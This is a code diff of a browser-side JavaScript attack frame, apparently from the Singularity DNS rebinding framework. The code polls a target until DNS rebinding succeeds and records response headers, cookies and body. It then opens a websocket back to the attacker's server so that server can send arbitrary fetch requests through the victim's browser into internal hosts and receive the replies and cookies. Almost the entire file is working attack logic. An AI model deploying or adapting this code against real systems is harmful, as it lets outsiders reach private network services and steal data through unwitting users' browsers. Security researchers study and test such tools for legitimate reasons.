@@ -1,83 +1,185 @@
-var timer;
-var frame;
-var sessionid;
-var flushdns;
-var xhr;
-var interval = 60000;
+const Rebinder = () => {
+    let headers = null;
+    let cookie = null;
+    let body = null;
 
-function initCommsWithParentFrame() {
-    window.addEventListener("message", function (e) {
-        console.log("attack frame", window.location.hostname, "received message", e.data.cmd);
+    let url = null;
+    let rebindingDoneFn = null;
 
-        switch (e.data.cmd) {
-            case "interval":
-                interval = parseInt(e.data.param) * 1000;
-                break;
-            case "indextoken":
-                indextoken = e.data.param;
-                break;
-            case "flushdns":
-                if (e.data.param.flushDns === true) {
-                    console.log("Flushing Browser DNS cache.");
-                    flushBrowserDnsCache(e.data.param.hostname);
+    let timer = null;
+
+    let payload = null;
+    let interval = 60000;
+    let wsproxyport = 3129;
+    let rebindingSuccess = false;
+
+    const rebindingStatusEl = document.getElementById('rebindingstatus');
+
+    function initCommsWithParentFrame() {
+        window.addEventListener('message', function (e) {
+            console.log('attack frame', window.location.hostname, 'received message', e.data.cmd);
+
+            switch (e.data.cmd) {
+                case 'payload':
+                    payload = e.data.param;
+                    break;
+                case 'interval':
+                    interval = parseInt(e.data.param) * 1000;
+                    break;
+                case 'indextoken':
+                    indextoken = e.data.param;
+                    break;
+                case 'wsproxyport':
+                    wsproxyport = e.data.param;
+                    break;
+                case 'flushdns':
+                    if (e.data.param.flushDns === true) {
+                        console.log('Flushing Browser DNS cache.');
+                        flushBrowserDnsCache(e.data.param.hostname);
+                    }
+                    break;
+                case 'stop':
+                    clearInterval(timer);
+                    if (rebindingSuccess === false) {
+                        rebindingStatusEl.innerText = `DNS rebinding failed!`;
+                    }
+                    break;
+                case 'start':
+                    timer = setInterval(function () { run() }, interval);
+                    console.log('frame', window.location.hostname, 'waiting', interval,
+                        'milliseconds for dns update');
+                    break;
+            }
+        });
+    };
+
+    function init(myUrl, myRebindingDoneFn) {
+        url = myUrl;
+        rebindingDoneFn = myRebindingDoneFn;
+        initCommsWithParentFrame();
+        window.parent.postMessage({
+            status: 'start'
+        }, "*");
+    };
+
+    function run() {
+        fetch(url, {
+            credentials: 'omit',
+        })
+            .then(function (r) {
+
+                if (r.headers.get('X-Singularity-Of-Origin') === 't') {
+                    throw new Error('hasSingularityHeader');
                 }
-                break;
-            case "stop":
-                clearInterval(timer);
-                break;
-            case "start":
-                timer = setInterval(attack, interval);
-                console.log("frame", window.location.hostname, "waiting", interval,
-                    "milliseconds for dns update");
-                break;
-        }
-    });
-}
 
-// Notify the parent that attack frame is loaded.
-function begin() {
-    window.parent.postMessage({
-        status: "start"
-    }, "*");
-}
+                headers = r.headers;
+                cookie = document.cookie;
 
-// checks if Response is '200' and return Promise Body.text()
-// otherwise throw an error with errorString
-function responseOKOrFail(errorString) {
-    return function (r) {
-        if (r.ok) {
-            console.log("attack frame ", window.location.hostname, " received a response");
-            return r.text()
-        } else {
-            throw new Error(errorString)
-        }
+                if (r.headers.get('www-authenticate') !== null) {
+                    return new Promise(function (resolve, reject) {
+                        reject(new Error('requiresHttpAuthentication'));
+                    });
+                };
+
+                return r.text();
+            })
+            .then(function (responseData) { // we successfully received the server response
+                if (responseData.length === 0) {
+                    // Browser is probably confused about abrupt connection drop. 
+                    // Let's wait for the next iteration.
+                    throw new Error('invalidResponseLength');
+                }
+
+                if (responseData.includes(indextoken)) {
+                    throw new Error('hasToken');
+                }
+
+                body = responseData;
+                clearInterval(timer); // stop the attack timer
+                // Report success to parent frame
+                window.parent.postMessage({
+                    status: 'success',
+                    response: body
+                }, "*");
+                // Terminate the attack
+                rebindingSuccess = true;
+                rebindingStatusEl.innerText = `DNS rebinding successful!`;
+                rebindingDoneFn(payload, headers, cookie, body, wsproxyport);
+            })
+            .catch(function (error) {
+                if (error instanceof TypeError) { // We cannot establish an HTTP connection
+                    console.log('frame ' + window.location.hostname + ' could not load: ' + error);
+                    window.parent.postMessage({
+                        status: 'error',
+                    }, "*");
+                } else if (error.message === 'hasSingularityHeader' ||
+                    error.message === 'invalidResponseLength' ||
+                    error.message === 'hasToken') {
+                    console.log(`DNS rebinding did not happen yet: ${window.location.host}`)
+                } else if (error.message == 'requiresHttpAuthentication') {
+                    console.log('This resource requires HTTP Authentication.');
+                    window.parent.postMessage({
+                        status: 'requiresHttpAuthentication',
+                    }, "*");
+                    rebindingDoneFn(payload, headers, cookie, null);
+                } else { // We did not handle something
+                    console.log('Unhandled error: ' + error);
+                    window.parent.postMessage({
+                        status: 'error',
+                    }, "*");
+                }
+            });
+    };
+
+    return {
+        init,
+        run,
     }
 }
 
-// terminates attack and inform parent frame
-function attackSuccess(message) {
-    console.log(message);
-    clearInterval(timer); //stop attack
-    window.parent.postMessage({
-        status: "success",
-        response: message
-    }, "*");
+function timeout(ms, promise, controller) {
+    return new Promise(function (resolve, reject) {
+        setTimeout(function () {
+            controller.abort();
+            reject(new Error('timeout'))
+        }, ms)
+        promise.then(resolve, reject)
+    })
 }
 
-// Request target to establish a websocket to Singularity server and wait for commands
-function webSocketHook(initialCookie) {
-    const serverIp = document.location.hostname.split('-')[1]
-    const wsurl = document.location.port ? `${serverIp}:${document.location.port}` :
-        `${serverIp}`;
+function begin(url) {
+    const hostnameEl = document.getElementById('hostname');
+    const arr = window.location.hostname.split('-');
+    const port = document.location.port ? document.location.port : '80';
+    hostnameEl.innerText = `target: ${arr[2]}:${port}, session: ${arr[3]}, strategy: ${arr[4]}`;
+    r = Rebinder();
+    r.init(url, attack);
+}
 
-    var ws = new WebSocket(`ws://${wsurl}/soows`);
+function wait(n) {return new Promise(resolve => setTimeout(resolve, n));}
+
+// Request target to establish a websocket to Singularity server and wait for commands
+// Implements retries to handle multiple answer strategy and firewall blocks.
+function webSocketHook(initialCookie, wsProxyPort, retry) {
+    if (retry < 0) {
+        console.log(`Abandoning websocket connection to Singularity after too many retries for: ${window.location.host}`);
+        return;
+    }
+
+    const serverIp = document.location.hostname.split('-')[1]
+    const wsurl = `${serverIp}:${wsProxyPort}`
+
+    let ws = new WebSocket(`ws://${wsurl}/soows`);
+
     ws.onmessage = function (m) {
         const data = JSON.parse(m.data);
         if (data.command === 'fetch') {
             if (data.payload.fetchrequest.method === 'GET' || data.payload.fetchrequest.message === 'HEAD') {
                 delete data.payload.fetchrequest.body;
             } else {
-                data.payload.fetchrequest.body = atobUTF8(data.payload.fetchrequest.body)
+                if (data.payload.fetchrequest.body !== null) {
+                    data.payload.fetchrequest.body = atobUTF8(data.payload.fetchrequest.body)
+                }
             }
             const messageID = data.payload.fetchrequest.id
             let fetchResponse = {
@@ -86,51 +188,77 @@ function webSocketHook(initialCookie) {
                 "response": {},
                 "body": "",
             }
-            fetch(data.payload.url, data.payload.fetchrequest)
-                .then(function (r) {
-                    fetchResponse.response.headers = r.headers;
-                    fetchResponse.response.ok = r.ok;
-                    fetchResponse.response.redirected = r.redirected;
-                    fetchResponse.response.status = r.status;
-                    fetchResponse.response.type = r.type;
-                    fetchResponse.response.url = r.url;
-                    fetchResponse.response.body = r.body;
-                    fetchResponse.response.bodyUsed = r.bodyUsed;
-                    fetchResponse.response.headers = {};
-                    for (let pair of r.headers.entries()) {
-                        fetchResponse.response.headers[pair[0]] = pair[1];
-                    };
-                    fetchResponse.response.cookies = getCookies();
-                    return r.arrayBuffer()
-                })
-                .then(function (result) {
-                    fetchResponse.body = base64ArrayBuffer(result);
-                    ws.send(JSON.stringify(fetchResponse));
-                }).catch(function (e) {
-                    console.log(e);
-                });
+
+            const fetch_retry = (url, options, n) => fetch(url, options)
+            .then(function (r) {
+                fetchResponse.response.headers = r.headers;
+                fetchResponse.response.ok = r.ok;
+                fetchResponse.response.redirected = r.redirected;
+                fetchResponse.response.status = r.status;
+                fetchResponse.response.type = r.type;
+                fetchResponse.response.url = r.url;
+                fetchResponse.response.body = r.body;
+                fetchResponse.response.bodyUsed = r.bodyUsed;
+                fetchResponse.response.headers = {};
+                for (let pair of r.headers.entries()) {
+                    fetchResponse.response.headers[pair[0]] = pair[1];
+                };
+                fetchResponse.response.cookies = getCookies();
+                return r.arrayBuffer()
+            })
+            .then(function (result) {
+                fetchResponse.body = base64ArrayBuffer(result);
+                ws.send(JSON.stringify(fetchResponse));
+            }).catch(function (e) {
+                console.log(`Hook and command payload's fetch failed for frame ${window.location}: ${e}`);
+                if (n === 1) throw "Hook and command payload's fetch failed";
+                wait(1000).then( () => {return fetch_retry(url, options, n - 1);})
+            });;
+
+            fetch_retry(data.payload.url, data.payload.fetchrequest, 10);
+                
         }
 
     }
-    ws.onopen = function (evt) {}
+    ws.onopen = function (evt) { }
     ws.onerror = function (e) {
         console.log(`WS error: ${e}`);
     }
+
+    wait(1000)
+        .then(() => {
+            if (ws.readyState !== 1) {
+                webSocketHook(initialCookie, wsProxyPort, retry - 1);
+            } else {
+                console.log(`Successfully connected to Singularity via websockets for: ${window.location.host}`);
+            }
+        })
 }
 
 function buildCookie(val, days) {
-    var expires = "";
+    let expires = "";
     if (days) {
         let date = new Date();
         date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
-        expires = "; expires=" + date.toUTCString();
+        expires = '; expires=' + date.toUTCString();
     }
     return `${val} ${expires} ; path=/`;
 }
 
 function getCookies() {
-    return document.cookie === "" ? [] : document.cookie.split(';').map(x => x.trim());
+    return document.cookie === '' ? [] : document.cookie.split(';').map(x => x.trim());
 
+}
+
+function responseOKOrFail(errorString) {
+    return function (r) {
+        if (r.ok) {
+            console.log('attack frame ', window.location.hostname, ' received a response');
+            return r.text()
+        } else {
+            throw new Error(errorString)
+        }
+    }
 }
 
 // Converts an ArrayBuffer directly to base64, without any intermediate 'convert to string then
@@ -217,16 +345,16 @@ function base64ArrayBuffer(arrayBuffer) {
         if (point >= 0xD800 && point <= 0xDBFF) {
             var nextcode = nonAsciiChars.charCodeAt(1);
             if (nextcode !== nextcode) // NaN because string is 1 code point long
-                return fromCharCode(0xef /*11101111*/ , 0xbf /*10111111*/ , 0xbd /*10111101*/ );
+                return fromCharCode(0xef /*11101111*/, 0xbf /*10111111*/, 0xbd /*10111101*/);
             // https://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae
             if (nextcode >= 0xDC00 && nextcode <= 0xDFFF) {
                 point = (point - 0xD800) * 0x400 + nextcode - 0xDC00 + 0x10000;
                 if (point > 0xffff)
                     return fromCharCode(
                         (0x1e /*0b11110*/ << 3) | (point >>> 18),
-                        (0x2 /*0b10*/ << 6) | ((point >>> 12) & 0x3f /*0b00111111*/ ),
-                        (0x2 /*0b10*/ << 6) | ((point >>> 6) & 0x3f /*0b00111111*/ ),
-                        (0x2 /*0b10*/ << 6) | (point & 0x3f /*0b00111111*/ )
+                        (0x2 /*0b10*/ << 6) | ((point >>> 12) & 0x3f /*0b00111111*/),
+                        (0x2 /*0b10*/ << 6) | ((point >>> 6) & 0x3f /*0b00111111*/),
+                        (0x2 /*0b10*/ << 6) | (point & 0x3f /*0b00111111*/)
                     );
             } else return fromCharCode(0xef, 0xbf, 0xbd);
         }
@@ -235,8 +363,8 @@ function base64ArrayBuffer(arrayBuffer) {
             return fromCharCode((0x6 << 5) | (point >>> 6), (0x2 << 6) | (point & 0x3f));
         } else return fromCharCode(
             (0xe /*0b1110*/ << 4) | (point >>> 12),
-            (0x2 /*0b10*/ << 6) | ((point >>> 6) & 0x3f /*0b00111111*/ ),
-            (0x2 /*0b10*/ << 6) | (point & 0x3f /*0b00111111*/ )
+            (0x2 /*0b10*/ << 6) | ((point >>> 6) & 0x3f /*0b00111111*/),
+            (0x2 /*0b10*/ << 6) | (point & 0x3f /*0b00111111*/)
         );
     }
     window["btoaUTF8"] = function (inputString, BOMit) {
@@ -254,7 +382,7 @@ function base64ArrayBuffer(arrayBuffer) {
         if (leadingOnes < 5 && stringLen >= leadingOnes) {
             codePoint = (codePoint << leadingOnes) >>> (24 + leadingOnes);
             for (endPos = 1; endPos < leadingOnes; ++endPos)
-                codePoint = (codePoint << 6) | (encoded.charCodeAt(endPos) & 0x3f /*0b00111111*/ );
+                codePoint = (codePoint << 6) | (encoded.charCodeAt(endPos) & 0x3f /*0b00111111*/);
             if (codePoint <= 0xFFFF) { // BMP code point
                 result += fromCharCode(codePoint);
             } else if (codePoint <= 0x10FFFF) {
@@ -287,4 +415,12 @@ function flushBrowserDnsCache(hostname) {
     worker.postMessage(params);
 }
 
-initCommsWithParentFrame();
+function httpHeaderstoText(headers) {
+    out = "";
+    for (let pair of headers.entries()) {
+        out = (`${out}\n${pair[0]}: ${pair[1]}`);
+    };
+    return out;
+}
+
+let Registry = {};
